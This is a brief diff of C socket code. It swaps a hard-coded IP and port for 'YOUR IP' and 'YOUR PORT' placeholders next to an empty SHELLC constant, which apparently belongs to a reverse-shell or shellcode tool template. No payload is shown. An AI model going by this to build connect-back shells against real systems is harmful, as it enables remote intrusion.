@@ -6,8 +6,8 @@
 #include <netinet/in.h>
 #include <unistd.h>
 
-#define SERV_PORT 8777
-#define SERV_HOST "192.168.1.11"
+#define SERV_PORT "YOUR PORT"
+#define SERV_HOST "YOUR IP"
 
 #define SHELLC ""
 struct sockaddr_in net_setup;
